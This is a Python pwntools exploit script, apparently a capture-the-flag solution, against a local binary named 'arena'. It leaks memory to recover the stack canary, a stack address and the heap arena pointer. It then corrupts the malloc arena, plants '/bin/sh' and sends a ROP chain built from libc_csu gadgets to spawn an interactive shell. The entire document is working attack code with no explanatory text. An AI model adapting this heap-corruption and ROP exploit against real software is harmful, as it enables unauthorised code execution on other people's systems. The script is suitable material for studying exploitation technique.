def add(ind,size,data):
        p.sendline("add");
	p.recvuntil("Index: ")
        p.sendline("%s"%ind);
        p.recvuntil(": ")
        p.sendline("%d"%size)
        p.recvuntil("a: ")
        p.sendline(data)

def prt(idx,sz):
        p.sendline("print");
        p.sendline(str(idx))
        p.recvuntil("e: ")
        p.sendline("%s"%sz)
        return p.recvn(sz)

from pwn import *
cmd=0x6010c0+0x20
p=process("./arena")
sh=0x7fffffffe050
p.sendline("ls".ljust(8,'\0')+p64(0x22)+p64(0xdeadbeef))
add(0,0x21000,"\0")
res=prt(0,0x24000)
for x in range(0,0x24000,8):
	zz=x;	
	x= u64(res[x:x+8])
	if(x!=0):
		hex(x);
		#print zz 
		#print hex(x)
	if(zz==0x23718):
		canary=x
		log.info("Canary==========>%s",hex(canary))
	if(zz==0x239f0):
		stack=x;
		log.info("Stack==========>%s",hex(stack))
	if(zz==0x236b8):
		arena=x;
		log.info("arena==========>%s",hex(arena))
payload=0x22000*'x'+res[:0x236b8]+p64(cmd)+res[0x236c0:0x23720]
p.sendline("add")
p.recvuntil("Index: ")
p.sendline("3");
p.recvuntil("e: ")
p.sendline("40")
p.recvuntil("a: ")
p.sendline("/bin/sh\0"+p64(0x7ffff7af33f0))
add(1,0x21000,payload)
log.success("+++++++++++++%s+++++++++++","check 0x7ffff7ff36c8 OK!")
payload="add".ljust(32,"\0")+p64(0)+p64(stack-0x70)
p.sendline(payload)
log.success("+++++++++++++%s+++++++++++","check malloc_state OK!")
p.recvuntil("Index: ")
p.sendline("2");
p.recvuntil(": ")
p.sendline("20")
p.recvuntil("a: ")
payload=p64(0)*2+p64(0x400b90)+p64(canary)+p64(stack+176)+p64(0)+p64(0x400b90)
rbx=0;
rbp=0;
r12=0x603020+0x8;
r13=0;
r14=0;
r15=0x603020
payload+=p64(0x400bea)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)+p64(0x400bd0)
if False:
	gdb.attach(p,'''
	finish
	finish
	finish
	finish
	''')
p.sendline(payload)
p.sendline("exit")
p.interactive();
